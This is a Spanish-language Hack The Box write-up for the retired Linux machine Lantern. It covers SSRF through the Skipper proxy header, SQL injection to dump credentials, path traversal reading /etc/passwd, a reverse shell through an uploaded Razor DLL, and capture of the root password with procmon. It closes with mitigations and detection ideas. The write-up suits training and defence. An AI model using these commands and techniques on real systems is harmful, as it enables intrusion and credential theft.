---
machine: Lantern
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, web, ssrf, blazor, sqli, dotnet, privesc]
---

# Lantern — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Skipper Proxy en `80` es vulnerable a CVE-2022-38580: la cabecera `X-Skipper-Proxy` hace que el proxy solicite una URL arbitraria. Con ella se alcanza un servicio interno en `5000`, una aplicación Blazor de RR. HH. con SQLite virtualizado en el navegador. La búsqueda de vacaciones es inyectable y permite volcar la tabla `Employees`, incluida la contraseña de `admin` en `InternalInfo`. El panel de `3000` carga módulos `.dll` desde `/opt/components`; la web principal tiene un file read en `/PrivacyAndPolicy` y el módulo de subida escribe archivos con traversal. Se sube una Razor Class Library maliciosa para ejecutar código como `tomas`. `tomas` puede ejecutar `procmon` como root; al adjuntarlo a un `nano` de root que edita `/root/backup.sh`, se recupera la contraseña de root de los eventos `write`.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80,3000 <IP>
```

- `22` OpenSSH 8.9p1.
- `80` Skipper Proxy, redirección a `lantern.htb`.
- `3000` Kestrel con una aplicación Blazor de login.

```bash
echo '<IP> lantern.htb' | sudo tee -a /etc/hosts
```

La web pública es una empresa de IT con `/vacancies` y `/submit` para enviar currículums. El panel de `3000` es Blazor Server y usa WebSockets o polling.

## Enumeración

Se confirma Skipper y se prueba la cabecera:

```bash
curl -s http://lantern.htb/ -H 'X-Skipper-Proxy: http://<ATTACKER>:8000'
```

La petición llega desde Lantern con la ruta original. Un fuzz de puertos internos con la misma cabecera encuentra `5000` y `8000`; `5000` sirve otra aplicación Blazor, `InternaLantern`.

Con un proxy de cabeceras se navega la aplicación interna. El formulario de vacaciones busca por ID y refleja errores SQL. Una comilla rompe la consulta y `-- -` la comenta; con `UNION SELECT` de tres columnas se extrae `sqlite_version()` y el esquema. La tabla `Employees` contiene `InternalInfo` con credenciales de `admin`.

## Foothold

Las credenciales de `admin` funcionan en `http://lantern.htb:3000`. El panel permite cargar módulos desde `/opt/components`; el módulo `Files` muestra el código de la web pública. En `app.py`, `/PrivacyAndPolicy` concatena `lang` y `ext` en una ruta:

```bash
curl 'http://lantern.htb/PrivacyAndPolicy?lang=.&ext=/../../../etc/passwd'
```

Ese file read permite descargar `FileUpload.dll`. El módulo combina `/var/www/sites/lantern.htb/static/images` con el nombre del archivo y solo elimina `\`, por lo que un nombre con `../` escribe fuera del directorio. Se sube una Razor Class Library .NET 6 con un componente `Component.razor` cuyo `OnInitialized()` lanza una reverse shell, y se carga desde el panel. La shell es de `tomas`.

## Movimiento lateral

No hay pivote: `tomas` es el único usuario con shell. Su home contiene el proyecto `LanternAdmin` y una clave SSH.

## Escalada de privilegios

`tomas` puede ejecutar `/usr/bin/procmon` como root sin contraseña. Hay un proceso root `nano /root/automation.sh` y un `expect` que ejecuta `/root/bot.exp`. Se adjunta `procmon` al `nano`:

```bash
sudo procmon -p $(pidof nano)
```

Se filtran las llamadas `write`, se exporta la base SQLite con F6 y se extraen los buffers. Entre los eventos aparece la línea que el bot escribe:

```text
echo <PASSWORD> | sudo ./backup.sh
```

Esa contraseña funciona para `root`:

```bash
su -
id
```

## Evidencia

- Cabecera `X-Skipper-Proxy` con respuesta desde el host atacante.
- Puertos `5000`/`8000` accesibles por SSRF.
- Errores SQL y volcado de `Employees`/`InternalInfo`.
- Login en `3000` con `admin`.
- `/PrivacyAndPolicy` leyendo `/etc/passwd` y `FileUpload.dll`.
- DLL Razor cargada y shell como `tomas`.
- Base de `procmon` con la contraseña de root y `su -` exitoso.

## Lecciones aprendidas

- Una cabecera de proxy puede convertir un reverse proxy en un SSRF completo.
- Blazor puede ejecutar SQLite en el cliente, pero la lógica y los secretos siguen en el servidor.
- Un módulo que concatena rutas y solo filtra un separador permite traversal.
- `procmon` sobre un proceso root revela credenciales escritas en terminales y scripts.
- La lectura de código fuente acelera la búsqueda de rutas y módulos.

## Mitigaciones y detección

- Actualizar Skipper y no confiar en `X-Skipper-Proxy` enviado por el cliente.
- Parametrizar SQL y no devolver errores de base de datos al navegador.
- Resolver rutas con `realpath` y limitar la carga de DLLs a un directorio firmado.
- No ejecutar módulos subidos por usuarios; validar nombre, tipo y ruta.
- Restringir `procmon` y no teclear contraseñas en scripts o terminales de root.
- Detectar cabeceras de proxy anómalas, `UNION SELECT`, traversal en `lang`/`ext` y DLLs nuevas en `/opt/components`.

## Referencias

- [0xdf — Lantern](https://0xdf.gitlab.io/2024/11/30/htb-lantern.html)
- [IppSec — Lantern](https://www.youtube.com/watch?v=nuwlmlEp4qY)
- [NVD — CVE-2022-38580](https://nvd.nist.gov/vuln/detail/CVE-2022-38580)
- [Hack The Box — Lantern](https://app.hackthebox.com/machines/lantern)
